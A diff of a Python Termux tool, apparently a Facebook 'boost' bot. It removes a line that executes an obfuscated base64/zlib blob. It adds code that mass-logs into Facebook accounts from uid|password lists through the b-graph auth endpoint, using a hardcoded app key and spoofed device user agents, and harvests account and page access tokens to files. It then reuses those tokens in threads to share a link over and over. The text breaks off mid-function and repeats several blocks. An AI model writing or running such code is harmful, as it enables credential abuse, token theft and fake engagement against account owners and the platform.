@@ -1,4 +1,493 @@
+import requests
+import threading
+from concurrent.futures import ThreadPoolExecutor
+import random
+import time
+import sys
+import os
+import platform
+# Color codes for formatting output
+purple = "\033[1;35m"
+blue = "\033[34m"
+green = "\033[1;32m"
+red = "\033[1;31m"
+yellow = "\033[1;33m"
+white = "\033[1;37m"
+import random
+import string
+def clear_screen():
+    if 'termux' in platform.system().lower():
+        os.system('clear')
+    elif platform.system().lower() == 'windows':
+        os.system('cls')
+    else:
+        os.system('clear')
+def generate_user_agent():
+    fbav = f"{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}"
+    fbbv = str(random.randint(111111111, 999999999))
+    fbrv = '0'
+    random_seed = random.Random()
+    adid = ''.join(random_seed.choices(string.hexdigits, k=16))
+
+    # Randomly vary the Android OS version, device, and app version for realism
+    device = random.choice(["HUAWEI MAR-LX1M", "Samsung SM-G960F", "OnePlus GM1913"])
+    fbav_version = str(random.randint(49, 150))  # Updated range for FBAV versions
+    fbbv_version = str(random.randint(11111111, 77777777))
+    carrier = random.choice(["Ooredoo TN", "Orange", "Vodafone", "T-Mobile"])
+
+    ua_bgraph = f'[FBAN/FB4A;FBAV/{fbav_version}.0.0.{random.randrange(20, 49)}.{random.randint(11, 99)};FBBV/{fbbv_version};' \
+                f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1080,height=2107}};FBLC/fr_FR;' \
+                f'FBRV/{fbrv};FBCR/{carrier};FBMF/{device.split(" ")[0]};FBBD/{device.split(" ")[0]};' \
+                f'FBPN/com.facebook.katana;FBDV/{device};FBSV/9;FBOP/1;FBCA/arm64-v8a:]'
+    
+    return ua_bgraph
+
+ua_bgraph = generate_user_agent()
 
 
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import requests
+import random
+import concurrent.futures as thread
+import os
+import string
+
+# Random FB version generation
+fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
+fbbv = str(random.randint(111111111, 999999999))
+fbrv = '0'
+random_seed = random.Random()
+adid = ''.join(random_seed.choices(string.hexdigits, k=16))
+
+# User agent string
+ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:]'
+
+def bgraph(uid, pw, path_file, extract_type, success_count, existing_uids):
+    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'  # Example token
+
+    data = {
+        'method': 'auth.login',
+        'fb_api_req_friendly_name': 'authenticate',
+        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+        'email': uid,
+        'password': pw,
+        'access_token': accessToken
+    }
+
+    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+
+    try:
+        
+        if uid in existing_uids:
+            print(f"     {yellow}[INFO] {red}ACCOUNT --> {white}{uid} {red}already exists.")
+            print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+            return
+
+        response = requests.post(url, data=data).json()
+        
+        print(response)
+        if 'access_token' in response:
+            token = response['access_token']
+
+            with open(path_file, 'a') as f:
+                f.write(f"{uid}|{token}\n")
+
+            print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+            print(f"     \033[32m[SUCCESS]\033[0m: Extracted Account ─────> {uid}.")
+            print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+            success_count.append(uid)
+        else:
+            print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+            print(f"     \033[31m[FAILED]\033[0m: TO EXTRACT Account ─────> {uid}.")
+            print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+
+    except Exception as e:
+        print(f"     \033[1;31m[ERROR]\033[0m Error extracting account: {uid}. Reason: {str(e)}\033[0m\n")
+
+
+def proz(accounts_file, token_output_path, extract_type):
+    """Process the accounts and extract tokens concurrently."""
+    success_count = []
+
+    # Load existing uids from the output file to avoid duplicates
+    existing_uids = set()
+    if os.path.exists(token_output_path):
+        with open(token_output_path, 'r') as f:
+            existing_uids = {line.split('|')[0] for line in f.readlines()}
+
+    try:
+        with open(accounts_file, 'r') as file:
+            accounts = file.readlines()
+
+        accounts = [line.strip() for line in accounts if '|' in line.strip()]
+
+        if not accounts:
+            print(f"No valid accounts found in {accounts_file}.")
+            return
+
+        with thread.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = [executor.submit(bgraph, uid, pw, token_output_path, extract_type, success_count, existing_uids)
+                       for uid, pw in [account.split('|') for account in accounts]]
+
+            for future in futures:
+                future.result()
+
+        print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+        print(f"     \033[1;34m[SUCCESS]\033[0m: {len(success_count)} {extract_type}(s) successfully extracted.")
+        print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+
+    except FileNotFoundError:
+        print(f"File not found: {accounts_file}")
+        return
+
+import requests
+import random
+import concurrent.futures as thread
+import os
+import string
+
+fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
+fbbv = str(random.randint(111111111, 999999999))
+fbrv = '0'
+random_seed = random.Random()
+adid = ''.join(random_seed.choices(string.hexdigits, k=16))
+ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:]'
+
+def load_existing_tokens(path_file):
+    """Load existing accounts or pages from the output file."""
+    if os.path.exists(path_file):
+        with open(path_file, 'r') as f:
+            return {line.split('|')[0] for line in f.readlines()}  # Set of existing uids or page ids
+    return set()
+
+def bgraph_page(uid, pw, path_file, extract_type, success_count, existing_tokens):
+    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'  # Example token
+    
+    if uid in existing_tokens:
+        print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+        print(f"     {white}ACCOUNT ─────> {red}{uid} {green}ALREADY EXISTS")
+        return
+
+    data = {
+        'method': 'auth.login',
+        'fb_api_req_friendly_name': 'authenticate',
+        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+        'email': uid,
+        'password': pw,
+        'access_token': accessToken
+    }
+
+    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+
+    try:
+        response = requests.post(url, data=data).json()
+        
+        if 'access_token' in response:
+            token = response['access_token']
+
+            # Extract Facebook Pages associated with the account token
+            pages = extract_fb_pages(token)
+            if pages:
+                for page in pages:
+                    page_id = page['id']
+                    if page_id not in existing_tokens:
+                        with open(path_file, 'a') as f:
+                            f.write(f"{page_id}|{page['accessToken']}\n")
+                        print(f"{white}{uid}  ─────> {green}Page ID: {red}{page_id} {yellow}EXTRACTED SUCCESSFULLY")
+                        existing_tokens.add(page_id)
+                    else:
+                        print(f"{white}ID:  {page_id} ─────> {green}ALREADY EXISTS ! ")
+
+            else:
+                print(f"{white}{uid} ─────> {red}DOESN'T HAVE PAGES !")
+            
+            success_count.append(uid)
+        else:
+            print(f"{white}{uid}  ─────> {red}FAILED TO EXTRACT ! ")
+
+    except Exception as e:
+        print(f"[ERROR] Error extracting account: {uid}. Reason: {str(e)}")
+
+def extract_fb_pages(token):
+    url = 'https://graph.facebook.com/v18.0/me/accounts'
+    headers = {
+        'Authorization': f'Bearer {token}'
+    }
+    
+    pages_data = []
+    
+    while url:
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code != 200:
+            print(f'Error: {response.text}')
+            return None
+        
+        data = response.json()
+        for page in data.get('data', []):
+            pages_data.append({
+                'id': page.get('id'),
+                'accessToken': page.get('access_token')
+            })
+        
+        url = data.get('paging', {}).get('next')  # Update the URL for the next request
+
+    return pages_data
+
+def prozc(accounts_file, token_output_path, extract_type):
+    success_count = []
+    existing_tokens = load_existing_tokens(token_output_path)
+
+    try:
+        with open(accounts_file, 'r') as file:
+            accounts = file.readlines()
+
+        accounts = [line.strip() for line in accounts if '|' in line.strip()]
+
+        if not accounts:
+            print(f"No valid accounts found in {accounts_file}.")
+            return
+
+        with thread.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = [executor.submit(bgraph_page, uid, pw, token_output_path, extract_type, success_count, existing_tokens)
+                       for uid, pw in [account.split('|') for account in accounts]]
+
+            for future in futures:
+                future.result()
+
+        print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+        print(f"     \033[1;34m[SUCCESS]\033[0m: {len(success_count)} {extract_type}(s) successfully extracted.")
+        print("\033[1;37m───────────────────────────────────────────────────────────────\033[0m")
+
+    except FileNotFoundError:
+        print(f"File not found: {accounts_file}")
+def extraction():
+
+    clear_screen()
+    jovan()
+    print(f"     {white}[1] {yellow}EXTRACT {red}ACCOUNT")
+    print(f"     {white}[2] {yellow}EXTRACT {red}PAGES")
+    print("     \033[1;34m───────────────────────────────────────────────────────────────\033[0m")
+    choice = input(f"     {green}CHOICE: ").strip() 
+    if choice == '1':
+        axl1()
+    elif choice == '2':
+        axl2()
+    else:
+        print(f"     {red}INVALID CHOICE")
+def axl2():
+    clear_screen()
+    jovan()
+    folder_path = "/sdcard/boostphere"  
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    print(f"     \033[31m[01] \033[32mFRA EXTRACT ACCOUNT")
+    print(f"     \033[31m[02] \033[32mFRA EXTRACT PAGES")
+    print(f"     \033[31m[03] \033[32mRPW EXTRACT ACCOUNT")
+    print(f"     \033[31m[04] \033[32mRPW EXTRACT PAGES")
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    save_choice = input(f"     \033[32mCHOICE: ").strip()
+
+    if save_choice == '1':
+        account_file = os.path.join(folder_path, "FRAACCOUNT.txt")
+        extract_type = 'account'
+    elif save_choice == '2':
+        account_file = os.path.join(folder_path, "FRAPAGES.txt")
+        extract_type = 'page'
+    elif save_choice == '3':
+        account_file = os.path.join(folder_path, "RPWACCOUNT.txt")
+        extract_type = 'account'
+    elif save_choice == '4':
+        account_file = os.path.join(folder_path, "RPWPAGES.txt")
+        extract_type = 'page'
+    else:
+        print("Invalid choice. Exiting.")
+        return
+
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    print(f"     \033[33mTHE FORMAT SHOULD BE \033[31muid|pass")
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    file_path = input(f"     \033[33mPATH: ").strip()
+
+    prozc(file_path, account_file, extract_type)
+def axl1():
+    clear_screen()
+    jovan()
+    folder_path = "/sdcard/boostphere"
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    print(f"     \033[31m[01] \033[32mFRA EXTRACT ACCOUNT")
+    print(f"     \033[31m[02] \033[32mFRA EXTRACT PAGES")
+    print(f"     \033[31m[03] \033[32mRPW EXTRACT ACCOUNT")
+    print(f"     \033[31m[04] \033[32mRPW EXTRACT PAGES")
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    save_choice = input(f"     \033[32mCHOICE: ").strip()
+
+    if save_choice == '1':
+        account_file = os.path.join(folder_path, "FRAACCOUNT.txt")
+        extract_type = 'account'
+    elif save_choice == '2':
+        account_file = os.path.join(folder_path, "FRAPAGES.txt")
+        extract_type = 'page'
+    elif save_choice == '3':
+        account_file = os.path.join(folder_path, "RPWACCOUNT.txt")
+        extract_type = 'account'
+    elif save_choice == '4':
+        account_file = os.path.join(folder_path, "RPWPAGES.txt")
+        extract_type = 'page'
+    else:
+        print("Invalid choice. Exiting.")
+        return
+
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    print(f"     \033[33mTHE FORMAT SHOULD BE \033[31muid|pass")
+    print(f"    \033[34m───────────────────────────────────────────────────────────────\033[0m")
+    file_path = input(f"     \033[33mPATH: ").strip()
+
+    token_output_path = account_file
+
+    proz(file_path, token_output_path, extract_type)
+def jovan():
+    adrkz = "\033[34m "
+    print(f"""
+    {adrkz} 
+            ██╗███╗   ██╗██████╗ ██╗ ██████╗  ██████╗ 
+            ██║████╗  ██║██╔══██╗██║██╔════╝ ██╔═══██╗
+            ██║██╔██╗ ██║██║  ██║██║██║  ███╗██║   ██║
+            ██║██║╚██╗██║██║  ██║██║██║   ██║██║   ██║
+            ██║██║ ╚████║██████╔╝██║╚██████╔╝╚██████╔╝
+            ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝ ╚═════╝  ╚═════╝
+     {blue}───────────────────────────────────────────────────────────────\033[0m""")
+
+def get_token_from_file(file_path):
+    """Read tokens from the file and return a random token."""
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+        tokens = [line.strip().split('|')[1] for line in lines if '|' in line]
+    return random.choice(tokens)
+
+class FacebookPoster:
+    def __init__(self, link):
+        self.link = link
+
+    def share_post(self, token):
+        """Shares a post on the user's feed with 'Only Me' privacy."""
+        url = "https://graph.facebook.com/v13.0/me/feed"
+        payload = {
+            'link': self.link,
+            'published': '0',
+            'privacy': '{"value":"SELF"}',
+            'access_token': token
+        }
+        try:
+            response = requests.post(url, data=payload)
+            if response.status_code == 200:
+                print(f"    {blue}───────────────────────────────────────────────────────────────\033[0m")
+                print("      Successfully Shared")
+                return True
+            else:
+                return False
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
+            return False
+
+def share_in_threads(link, file_path, num_shares):
+    start_all = time.time()  # Record the start time for the entire operation
+    
+    def worker():
+        success = False
+        while not success:
+            token = get_token_from_file(file_path)
+            fb_poster = FacebookPoster(link)
+            success = fb_poster.share_post(token)
+
+    max_workers = 40
